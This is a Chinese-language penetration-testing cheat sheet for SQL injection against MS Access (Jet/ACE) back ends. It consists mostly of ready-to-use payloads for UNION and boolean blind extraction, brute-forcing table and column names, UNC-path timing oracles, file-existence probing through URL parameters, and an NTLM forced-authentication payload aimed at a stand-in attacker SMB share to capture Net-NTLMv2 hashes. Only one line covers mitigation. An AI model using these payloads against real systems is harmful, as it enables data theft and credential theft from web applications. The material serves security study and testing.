---
attack_surface: [注入类]
impact: [信息泄露, 身份伪造, NTLM 凭证窃取]
risk_level: 高
prerequisites:
  - SQL 注入基础
  - MS Access / Jet 引擎特性
difficulty: 中级
related_techniques:
  - mysql-injection
  - mssql-injection
  - ssrf-server-side-request-forgery
tools:
  - sqlmap
  - Access PassView
---

# MS Access SQL Injection — Jet/ACE 引擎注入

> 关联文档：[SQL Injection 总览](../README.md) · [MSSQL Injection](../MSSQL%20Injection.md) · [MySQL Injection](../MySQL%20Injection.md)

---

# 0x01 DB 局限性速查

| 特性 | MS Access |
|------|-----------|
| **字符串拼接** | `&` (%26) 和 `+` (%2b) |
| **注释** | **无注释语法**。可用 NULL 字节 `%00` 截断，或用 `WHERE ''='` 修复句法 |
| **堆叠查询** | 不支持 |
| **LIMIT** | 无 `LIMIT`。使用 `TOP` 和 `LAST` |
| **子查询** | 必须带 `FROM` (需要知道的表名) |

---

# 0x02 基础注入

```sql
-- 字符串拼接
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00

-- NULL 字节截断 (替代注释)
1' UNION SELECT 1,2 FROM table%00

-- 语法修复 (无 NULL 时)
1' UNION SELECT 1,2 FROM table WHERE ''='
```

---

# 0x03 Chaining Equals 技术 (链式相等)

MS Access 支持特殊语法 `'1'=2='3'='asd'=false`，可构造布尔注入无需知道表名：

```sql
-- 当前表字段值提取
'=(Mid(username,1,3)='adm')='

-- 原理: 'a'='b'='c' 在 WHERE 子句中以微妙方式求值
-- 利用 Mid() 逐字符 + 链式相等 = TRUE/FALSE oracle
```

**联合 TOP + LAST + Mid 跨行提取**：

```sql
-- 已知表名和列名时:
'=(Mid((SELECT LAST(username) FROM (SELECT TOP 1 username FROM usernames)),1,3)='Alf')='

-- 逐行提取 (TOP N → LAST 获取第 N 行)
'=(Mid((SELECT LAST(username) FROM (SELECT TOP 5 username FROM users)),1,1)='a')='
```

---

# 0x04 暴力破解表名/列名

```sql
-- 表名爆破 (链式相等法)
'=(SELECT TOP 1 'lala' FROM <table_name>)='
-- 传统方法
-1' AND (SELECT TOP 1 <table_name>)%00

-- 列名爆破 (链式相等法)
'=column_name='

-- GROUP BY 列名
-1' GROUP BY column_name%00

-- 跨表列名
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-- 字典: sqlmap common-tables.txt / nibblesec MS Access list
```

---

# 0x05 数据提取

```sql
-- IIF + Mid + LAST + TOP 组合
IIF((SELECT MID(LAST(username),1,1) FROM (SELECT TOP 10 username FROM users))='a',0,'ko')
-- 逐字符首字符匹配 → 200 OK vs 500 Error

-- 有用函数:
-- Mid('admin',1,1)   → 子串提取 (从 1 开始)
-- LEN('1234')        → 字符串长度
-- ASC('A')           → 字符→ASCII
-- CHR(65)            → ASCII→字符
-- IIF(1=1,'a','b')   → 条件三元
-- COUNT(*)           → 计数
```

---

# 0x06 时间盲注 (网络延迟法)

Jet/ACE 引擎无 `SLEEP()` 或 `WAITFOR`，但可通过 UNC 路径访问慢速/不可达的远程资源引入延迟：

```sql
' UNION SELECT 1 FROM SomeTable IN '\\10.10.14.3\doesnotexist\dummy.mdb'--
```

UNC 路径指向：
- 高延迟链路的 SMB 共享
- 在 SYN-ACK 后丢弃 TCP 握手的服务器
- 防火墙黑洞地址

**延迟时间 = 攻击 oracle**。注入谓词为真时选择慢速路径，否则走快速路径。

---

# 0x07 枚举系统表

```sql
SELECT MSysObjects.name
FROM MSysObjects
WHERE
  MSysObjects.type IN (1,4,6)
  AND MSysObjects.name NOT LIKE '~*'
  AND MSysObjects.name NOT LIKE 'MSys*'
ORDER BY MSysObjects.name;
-- ⚠ 通常 SQLi 场景下无法访问 MSysObjects
```

---

# 0x08 文件系统访问

## 8.1 Web 根目录泄露

```sql
-- 访问不存在的数据库 → 错误消息含 Web 根目录路径
http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00
```

## 8.2 文件存在性检测

```sql
-- 方法 1: IN 子句
http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00
-- 文件存在 → "数据库格式无效" 错误

-- 方法 2: 数据库表引用
http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00
-- 文件存在 → "数据库格式" 错误
```

## 8.3 .mdb 文件名猜测

```sql
http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00
-- name[i] = .mdb 文件名, realTable = 真实表名
-- 错误消息差异可区分有效/无效文件名
```

---

# 0x09 NTLM 凭证窃取 (强制认证)

Jet 4.0 起可通过 `IN '<path>'` 子句引用外部数据库：

```sql
SELECT first_name FROM Employees IN '\\server\share\hr.accdb';
```

**攻击链**：

```sql
1' UNION SELECT TOP 1 name FROM MSysObjects IN '\\attacker\share\poc.mdb'-- -
```

1. Jet 引擎尝试通过 SMB/WebDAV 对 `\\attacker\share` 进行认证
2. Web 服务器的 **Net-NTLMv2 哈希** 泄露到攻击者控制的 SMB 服务器（Responder）
3. 如果 .mdb/.accdb 文件被解析，可能触发内存损坏漏洞（如 CVE-2021-28455）

**缓解**：注册表 `AllowQueryRemoteTables = 0` 拒绝远程路径

---

# 0x0A .mdb 密码破解

[Access PassView](https://www.nirsoft.net/utils/accesspv.html) — 恢复 Access 95/97/2000/XP 或 Jet 3.0/4.0 数据库主密码

---

# 0x0B 参考资料

- [nibblesec — MS Access SQLi Full Walkthrough](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
- [KB5002984 — Blocking Remote Tables in Jet/ACE](https://support.microsoft.com/en-gb/topic/kb5002984-configuring-jet-red-database-engine-and-access-connectivity-engine-to-block-access-to-remote-databases-56406821-30f3-475c-a492-208b9bd30544)
- [Check Point — NTLM Forced Authentication via MS Access (2023)](https://research.checkpoint.com/2023/abusing-microsoft-access-linked-table-feature-to-perform-ntlm-forced-authentication-attacks/)
- [W3Schools Online MS Access SQL Playground](https://www.w3schools.com/sql/trysql.asp?filename=trysql_func_ms_format)
